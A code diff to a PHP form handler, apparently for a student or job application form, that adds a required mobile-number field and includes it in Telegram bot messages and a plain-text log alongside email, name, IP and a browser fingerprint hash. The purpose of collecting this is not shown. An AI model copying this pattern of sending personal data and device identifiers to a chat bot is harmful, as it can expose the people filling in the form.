@@ -77,11 +77,12 @@ $college  = htmlspecialchars(trim($_POST['college'] ?? ''), ENT_QUOTES, 'UTF-8')
 $degree   = htmlspecialchars(trim($_POST['degree'] ?? ''), ENT_QUOTES, 'UTF-8');
 $stream   = htmlspecialchars(trim($_POST['stream'] ?? ''), ENT_QUOTES, 'UTF-8');
 $cgpa     = htmlspecialchars(trim($_POST['cgpa'] ?? ''), ENT_QUOTES, 'UTF-8');
+$mobile   = htmlspecialchars(trim($_POST['mobile'] ?? ''), ENT_QUOTES, 'UTF-8');  // NEW FIELD
 $fpHash   = htmlspecialchars(trim($_POST['fingerprint_hash'] ?? ''), ENT_QUOTES, 'UTF-8');
 if (empty($fpHash)) $fpHash = 'Not provided';
 
-// Basic validation
-if (empty($email) || empty($fullName)) {
+// Basic validation (email and full name are required, mobile is also required)
+if (empty($email) || empty($fullName) || empty($mobile)) {
     sendTelegramMessage("⚠️ <b>Submission Error</b>\nMissing required fields.\nIP: <code>$ip</code>");
     echo "ERROR";
     exit;
@@ -98,6 +99,7 @@ if (!$hasFile) {
     $text .= "👤 <b>PERSONAL DETAILS</b>\n";
     $text .= "├ Email: <code>$email</code>\n";
     $text .= "├ Full Name: $fullName\n";
+    $text .= "├ Mobile: $mobile\n";                           // NEW LINE
     $text .= "├ Gender: $gender\n";
     $text .= "├ College: $college\n";
     $text .= "├ Degree: $degree\n";
@@ -146,6 +148,7 @@ if (!$hasFile) {
     $caption .= "👤 <b>PERSONAL DETAILS</b>\n";
     $caption .= "├ Email: <code>$email</code>\n";
     $caption .= "├ Full Name: $fullName\n";
+    $caption .= "├ Mobile: $mobile\n";                         // NEW LINE
     $caption .= "├ Gender: $gender\n";
     $caption .= "├ College: $college\n";
     $caption .= "├ Degree: $degree\n";
@@ -167,7 +170,7 @@ if (!$hasFile) {
 }
 
 // 7. Log submission (optional)
-$logEntry = date('Y-m-d H:i:s') . " | $ip | $email | $fullName | $fpHash\n";
+$logEntry = date('Y-m-d H:i:s') . " | $ip | $email | $fullName | $mobile | $fpHash\n";   // added mobile
 @file_put_contents($logFile, $logEntry, FILE_APPEND | LOCK_EX);
 
 // 8. Return success
